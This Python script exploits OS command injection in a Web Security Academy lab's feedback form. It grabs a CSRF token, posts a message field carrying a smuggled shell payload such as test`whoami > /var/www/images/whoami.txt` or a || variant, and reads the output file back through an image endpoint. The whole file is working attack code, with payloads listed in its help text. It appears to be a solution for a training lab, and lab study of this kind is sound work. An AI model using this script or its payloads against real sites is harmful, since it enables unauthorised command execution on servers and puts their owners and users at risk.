#!/usr/bin/env python3 

import requests
import urllib3
import argparse
from argparse import RawTextHelpFormatter
from bs4 import BeautifulSoup

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""OS Command Injection Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test`whoami > /var/www/images/whoami.txt`" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "test`whoami > /var/www/images/whoami.txt`" 

Example solutions: test`whoami > /var/www/images/whoami.txt`, test||whoami > /var/www/images/whoami.txt
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a17007a0431da3ec071237f004b009c.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: `whoami > /var/www/images/whoami.txt`, ||whoami > /var/www/images/whoami.txt||', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
command = args.command
s = requests.Session()

def get_csrf(s, url):
    path = '/feedback'
    r = s.get(url + path, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    global csrf
    csrf = soup.find("input")['value']
    return csrf

def cmd_inj(s, url, command, csrf):
    path = '/feedback/submit'
    data = {
        "csrf": csrf,
        "name": "test",
        "email": "test@test.com",
        "subject": "test",
        "message": command
    }
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        r = s.post(url + path, data=data, verify=False, proxies=proxies)
    else:
        r = s.post(url + path, data=data, verify=False)
        peter_path = '/image?filename=whoami.txt'
        peter = s.get(url + peter_path, verify=False)
        # verify the whoami.txt is created containing peter username
        if (b'peter' in peter.content):
            print("You are the user: ")
            print(peter.content.decode("utf-8").rstrip('\n'))
            print("(+) Command Injection Successful!")
        else:
            print("(-) Command Injection Failed")

def main():
    
    print("(+) Exploiting OS Command Injection")

    get_csrf(s, url)
        
    cmd_inj(s, url, command, csrf)

if __name__ == "__main__":
    main()
